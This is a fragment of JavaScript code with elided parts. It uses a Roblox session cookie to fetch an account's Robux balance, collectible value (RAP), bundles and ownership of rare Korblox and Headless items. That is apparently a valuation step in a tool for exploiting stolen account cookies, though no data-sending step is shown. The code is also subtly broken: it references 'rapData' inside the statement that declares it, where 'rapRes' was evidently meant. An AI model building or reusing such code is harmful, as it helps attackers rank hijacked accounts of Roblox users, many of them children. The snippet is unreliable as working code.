...
async function getRobloxUserData(cookie) {
  try {
    ...
    // Get additional user details, avatar, and inventory info in parallel
    const [detailsRes, avatarRes, robuxRes, rapRes, bundlesRes] = await Promise.all([
      ...
      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=10`),
      fetch(`https://catalog.roblox.com/v1/search/items?category=Bundles&creatorName=${userData.name}&limit=10`)
    ]);

    const [details, avatarData, robuxData, rapData, bundlesData] = await Promise.all([
      detailsRes.json(),
      avatarRes.json(),
      robuxRes.status === 200 ? robuxRes.json() : null,
      rapData.status === 200 ? rapData.json() : null,
      bundlesRes.status === 200 ? bundlesRes.json() : null
    ]);

    // Calculate RAP from collectibles
    let totalRAP = 0;
    if (rapData && rapData.data) {
      totalRAP = rapData.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
    }

    // Count bundles
    const bundleCount = bundlesData && bundlesData.data ? bundlesData.data.length : 0;

    // Check for specific items (Korblox and Headless)
    let hasKorblox = false;
    let hasHeadless = false;
    
    if (rapData && rapData.data) {
      hasKorblox = rapData.data.some(item => 
        item.name && item.name.toLowerCase().includes('korblox')
      );
      hasHeadless = rapData.data.some(item => 
        item.name && (item.name.toLowerCase().includes('headless') || item.assetId === 31117267)
      );
    }
    ...
    return {
      ...
      robux: robuxData ? robuxData.robux : 'Private',
      rap: totalRAP > 0 ? totalRAP.toLocaleString() : '0',
      bundles: bundleCount,
      hasKorblox,
      hasHeadless
    };
